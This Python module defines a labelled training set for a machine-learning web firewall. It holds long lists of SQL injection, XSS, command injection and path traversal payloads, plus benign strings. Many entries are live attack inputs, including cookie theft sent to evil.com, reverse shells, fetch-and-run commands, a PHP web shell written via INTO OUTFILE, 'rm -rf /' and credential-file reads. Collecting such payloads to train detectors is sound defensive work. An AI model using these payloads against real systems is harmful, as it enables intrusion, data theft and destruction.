"""
HThuong Antivirus AI — WAF Training Dataset
Tập dữ liệu huấn luyện cho ML WAF Engine
Gồm 5 nhãn: sqli, xss, cmdi, path_traversal, safe
"""

# ============================================================
# SQL INJECTION PAYLOADS
# ============================================================
SQLI_PAYLOADS = [
    # Classic tautology
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' OR 'a'='a' --",
    "' OR ''='",
    "admin' --",
    "admin'/*",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "') OR 1=1 --",
    "1' OR '1'='1",
    "1 OR 1=1",
    "' OR 'x'='x",
    "' OR 1 --",
    "1' OR 1=1 --",
    "' OR 1=1 LIMIT 1 --",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "' OR 1=1; --",

    # UNION based
    "' UNION SELECT NULL --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT username, password FROM users --",
    "' UNION ALL SELECT 1,2,3,4 --",
    "' UNION SELECT @@version --",
    "' UNION SELECT table_name FROM information_schema.tables --",
    "' UNION SELECT column_name FROM information_schema.columns --",
    "1 UNION SELECT 1,2,3",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT group_concat(table_name) FROM information_schema.tables --",
    "' UNION SELECT load_file('/etc/passwd') --",
    "' UNION SELECT 1, @@datadir --",
    " UNION SELECT * FROM users WHERE 1=1",
    "-1 UNION SELECT 1,2,3,4,5",

    # Stacked queries
    "'; DROP TABLE users --",
    "'; DROP DATABASE test --",
    "1; UPDATE users SET admin=1 WHERE id=1 --",
    "'; INSERT INTO users VALUES('hacker','pass') --",
    "'; DELETE FROM logs --",
    "'; EXEC xp_cmdshell('dir') --",
    "'; EXEC sp_executesql N'SELECT 1' --",
    "1; WAITFOR DELAY '0:0:5' --",

    # Blind SQLi
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' AND SUBSTRING(@@version,1,1)='5' --",
    "' AND ASCII(SUBSTRING(username,1,1))>64 --",
    "1' AND SLEEP(5) --",
    "1' AND BENCHMARK(5000000,SHA1('test')) --",
    "1' WAITFOR DELAY '0:0:10' --",
    "1 AND IF(1=1,SLEEP(5),0)",
    "' OR SLEEP(3)=0 --",
    "' OR IF(1=1,SLEEP(3),0) --",

    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) --",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1) --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    "' AND 1=CONVERT(int,(SELECT @@version)) --",
    "' HAVING 1=1 --",
    "' GROUP BY columnname HAVING 1=1 --",

    # Second-order / encoded
    "%27%20OR%201%3D1%20--",
    "%27%20UNION%20SELECT%201%2C2%2C3%20--",
    "admin%27--",
    "1%27+OR+%271%27%3D%271",
    "' oR '1'='1",

    # Auth bypass
    "admin' OR '1'='1",
    "admin') OR ('1'='1",
    "' OR 1=1 LIMIT 1 OFFSET 1 --",
    "admin'/**/OR/**/1=1--",

    # INTO OUTFILE
    "' UNION SELECT 1,'<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php' --",
    "' INTO OUTFILE '/tmp/data.txt' --",
    "' INTO DUMPFILE '/tmp/data.bin' --",

    # Comment-based evasion
    "'/**/OR/**/1=1--",
    "' /*!UNION*/ /*!SELECT*/ 1,2,3 --",
    "' OR/**/ 1=1 --",
]

# ============================================================
# XSS PAYLOADS
# ============================================================
XSS_PAYLOADS = [
    # Script tags
    '<script>alert("XSS")</script>',
    '<script>alert(document.cookie)</script>',
    '<script src="http://evil.com/xss.js"></script>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<script>document.location="http://evil.com/?c="+document.cookie</script>',
    '<script>new Image().src="http://evil.com/?c="+document.cookie</script>',
    '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
    '<script type="text/javascript">alert(1)</script>',
    '<script>var x=new XMLHttpRequest();x.open("GET","http://evil.com/?c="+document.cookie);x.send();</script>',

    # Event handlers
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror="alert(document.cookie)">',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<svg onload=alert(1)>',
    '<video onerror=alert(1)><source src=x>',
    '<audio onerror=alert(1)><source src=x>',
    '<div onmouseover="alert(1)">hover me</div>',
    '<a onmouseover=alert(1)>click</a>',
    '<input type="text" onchange="alert(1)">',
    '<select onchange=alert(1)><option>1</option></select>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<button onclick=alert(1)>click</button>',
    '<form onsubmit=alert(1)><input type=submit>',

    # javascript: protocol
    '<a href="javascript:alert(1)">click</a>',
    '<a href="javascript:void(0)" onclick="alert(1)">click</a>',
    '<iframe src="javascript:alert(1)">',
    "javascript:alert(document.cookie)",
    '<a href="jAvAsCrIpT:alert(1)">click</a>',

    # HTML injection
    '<iframe src="http://evil.com"></iframe>',
    '<object data="http://evil.com/xss.swf">',
    '<embed src="http://evil.com/xss.swf">',
    '<link rel="stylesheet" href="http://evil.com/evil.css">',
    '<meta http-equiv="refresh" content="0;url=http://evil.com">',

    # Encoded XSS
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',

    # DOM-based
    'document.write("<script>alert(1)</script>")',
    "document.cookie",
    'window.location="http://evil.com"',
    'eval("alert(1)")',
    'setTimeout("alert(1)",0)',
    'setInterval("alert(1)",1000)',

    # CSS-based
    '<div style="background:url(javascript:alert(1))">',
    '<div style="width:expression(alert(1))">',
    '<style>body{background:url(javascript:alert(1))}</style>',

    # SVG
    '<svg><script>alert(1)</script></svg>',
    '<svg/onload=alert(1)>',
    '<svg><animate onbegin=alert(1)>',

    # Data URI
    '<a href="data:text/html,<script>alert(1)</script>">click</a>',
    '<object data="data:text/html,<script>alert(1)</script>">',

    # vbscript
    '<a href="vbscript:MsgBox(1)">click</a>',
    'vbscript:MsgBox(document.cookie)',

    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0nOnerror=alert(1)//",
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '"><svg/onload=alert(1)>',
]

# ============================================================
# COMMAND INJECTION PAYLOADS
# ============================================================
CMDI_PAYLOADS = [
    # Semicolon-based
    "; ls",
    "; ls -la",
    "; cat /etc/passwd",
    "; whoami",
    "; id",
    "; uname -a",
    "; pwd",
    "; dir",
    "; rm -rf /",
    "; rm -rf *",
    "; wget http://evil.com/shell.sh",
    "; curl http://evil.com/malware -o /tmp/mal",
    "; nc -e /bin/sh evil.com 4444",
    "; bash -i >& /dev/tcp/evil.com/4444 0>&1",
    "; python -c 'import os; os.system(\"whoami\")'",
    "; perl -e 'exec \"/bin/sh\"'",
    "; php -r 'system(\"whoami\");'",
    "; sh -c 'whoami'",
    "; ping -c 3 evil.com",
    "; nslookup evil.com",

    # Pipe-based
    "| ls",
    "| cat /etc/passwd",
    "| whoami",
    "| id",
    "| uname -a",
    "| pwd",
    "| nc evil.com 4444",
    "| wget http://evil.com/shell.sh",
    "| curl http://evil.com",
    "| dir",

    # AND-based
    "&& ls",
    "&& cat /etc/passwd",
    "&& whoami",
    "&& id",
    "&& rm -rf /",
    "&& net user",
    "&& net localgroup administrators",
    "&& del C:\\Windows\\System32",

    # OR-based
    "|| ls",
    "|| whoami",
    "|| cat /etc/shadow",
    "|| id",

    # Backtick
    "`ls`",
    "`whoami`",
    "`cat /etc/passwd`",
    "`id`",
    "`uname -a`",
    "`rm -rf /`",

    # $() substitution
    "$(ls)",
    "$(whoami)",
    "$(cat /etc/passwd)",
    "$(id)",
    "$(uname -a)",
    "$(wget http://evil.com/shell.sh)",
    "$(curl http://evil.com/backdoor | sh)",
    "$(python -c 'import socket; ...')",

    # Redirect-based
    "> /tmp/output.txt",
    ">> /etc/crontab",
    "> /var/www/html/shell.php",

    # Windows
    "& dir",
    "& type C:\\Windows\\win.ini",
    "& net user hacker pass /add",
    "| type C:\\boot.ini",
    "& ipconfig /all",
    "& tasklist",
    "& systeminfo",

    # Encoded
    "%0als",
    "%0awhoami",
    "127.0.0.1%0a%0dls",
    "127.0.0.1\nwhoami",
    "127.0.0.1\r\ncat /etc/passwd",

    # Chained
    "; ls; whoami; id",
    "| ls && whoami",
    "`ls` && `whoami`",
]

# ============================================================
# PATH TRAVERSAL PAYLOADS
# ============================================================
PATH_TRAVERSAL_PAYLOADS = [
    # Basic
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/shadow",
    "../../../etc/hosts",
    "../../etc/passwd",
    "../etc/passwd",
    "../../../proc/self/environ",
    "../../../var/log/auth.log",
    "../../../var/log/syslog",
    "../../../root/.bash_history",
    "../../../root/.ssh/id_rsa",

    # Windows
    "..\\..\\..\\windows\\system32\\config\\sam",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\boot.ini",
    "..\\..\\..\\windows\\system.ini",
    "..\\..\\windows\\repair\\sam",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\windows\\win.ini",
    "C:\\boot.ini",
    "C:\\windows\\system32\\config\\sam",

    # Encoded
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
    "%2e%2e\\%2e%2e\\%2e%2e\\windows\\win.ini",
    "..%00/etc/passwd",
    "../../../etc/passwd%00.png",
    "..%5c..%5c..%5cwindows%5cwin.ini",

    # Double encoding
    "%252e%252e%252f",
    "..%252f..%252f",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",

    # Null byte
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd\x00.html",

    # Absolute paths
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/version",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",

    # Deep traversal
    "../../../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",

    # With file wrappers
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "php://filter/convert.base64-encode/resource=../../../etc/passwd",
]

# ============================================================
# SAFE / NORMAL PAYLOADS
# ============================================================
SAFE_PAYLOADS = [
    # Normal search queries
    "Hello, this is a normal search query",
    "How to learn Python programming",
    "Best restaurants near me",
    "Weather forecast for tomorrow",
    "Latest technology news 2024",
    "How to make chocolate cake",
    "Python tutorial for beginners",
    "Machine learning basics",
    "Top 10 movies of 2024",
    "JavaScript frameworks comparison",
    "React vs Vue vs Angular",
    "How to install Ubuntu Linux",
    "Best laptop for programming",
    "Online courses for data science",
    "Free music streaming services",
    "Remote work tips and tricks",
    "Healthy breakfast recipes",
    "How to train for a marathon",
    "Best coding practices 2024",
    "Web development roadmap",

    # Normal form inputs
    "John Doe",
    "john.doe@example.com",
    "123 Main Street, City, State 12345",
    "+1-555-123-4567",
    "I would like to order 3 items please",
    "My name is Alice and I'm from New York",
    "The quick brown fox jumps over the lazy dog",
    "Please process my refund request #12345",
    "Meeting scheduled for Monday at 10 AM",
    "Thank you for your excellent service!",
    "Product review: 5 stars, great quality",
    "I need help with my account settings",
    "How do I reset my password?",
    "Can you ship to international addresses?",
    "I'd like to cancel my subscription",

    # Normal URLs and strings
    "https://www.google.com/search?q=python",
    "contact@company.com",
    "Order #1234 has been shipped",
    "Your balance is $50.00",
    "2024-01-15T10:30:00Z",
    "Version 2.1.3",
    "Page 5 of 10",
    "Items 1-20 of 150",
    "Loading... please wait",
    "Successfully saved!",

    # Technical but not malicious
    "SELECT your preferred language from the dropdown",
    "Please DROP off the package at the door",
    "The script ran for 5 minutes",
    "We need to INSERT the USB drive",
    "DELETE the old files from your desktop",
    "UPDATE your browser to the latest version",
    "The UNION of workers voted yes",
    "Use the cat command to view files",
    "The OR operator returns true if either condition is met",
    "My password contains special characters like ! @ #",
    "Navigate to C:\\Users\\Documents to find the file",
    "The path ./config/settings.json contains the configuration",
    "Use cd .. to go up one directory",
    "The file is located in /home/user/documents",
    "Set encoding to UTF-8",
    "Content-Type: application/json",
    "Bearer token authentication",
    "Rate limited: 100 requests per minute",
    "API endpoint: /api/v2/users",
    "Error code 404: page not found",

    # Numbers and dates
    "1234567890",
    "2024-12-25",
    "Price: $19.99",
    "Discount: 25% off",
    "Temperature: 72°F",
    "File size: 2.5 MB",
    "Resolution: 1920x1080",
    "Duration: 2h 30m",
    "Score: 95/100",
    "Rating: 4.8 out of 5",

    # Multi-language
    "Xin chào, tôi cần hỗ trợ",
    "Bonjour, comment ça va?",
    "Hola, necesito ayuda",
    "こんにちは",
    "안녕하세요",
    "Здравствуйте",
    "Guten Tag",
    "مرحبا",

    # Edge cases that look suspicious but are safe
    "I'm having trouble with my login",
    "O'Brien's Irish Pub",
    "It's a beautiful day, isn't it?",
    "The ratio is 1:1 between products",
    "Use the -- flag for verbose output",
    "The comment starts with # in Python",
    "Save file as .html extension",
    "The <title> tag defines the page title",
    "Read the README.md file for instructions",
    "Use 'single quotes' for strings in Python",
]


def get_dataset() -> tuple[list[str], list[str]]:
    """
    Trả về (payloads, labels) cho training.
    Labels: 'sqli', 'xss', 'cmdi', 'path_traversal', 'safe'
    """
    payloads = []
    labels = []

    for p in SQLI_PAYLOADS:
        payloads.append(p)
        labels.append("sqli")

    for p in XSS_PAYLOADS:
        payloads.append(p)
        labels.append("xss")

    for p in CMDI_PAYLOADS:
        payloads.append(p)
        labels.append("cmdi")

    for p in PATH_TRAVERSAL_PAYLOADS:
        payloads.append(p)
        labels.append("path_traversal")

    for p in SAFE_PAYLOADS:
        payloads.append(p)
        labels.append("safe")

    return payloads, labels


if __name__ == "__main__":
    payloads, labels = get_dataset()
    from collections import Counter
    counts = Counter(labels)
    print(f"Total samples: {len(payloads)}")
    for label, count in sorted(counts.items()):
        print(f"  {label}: {count}")
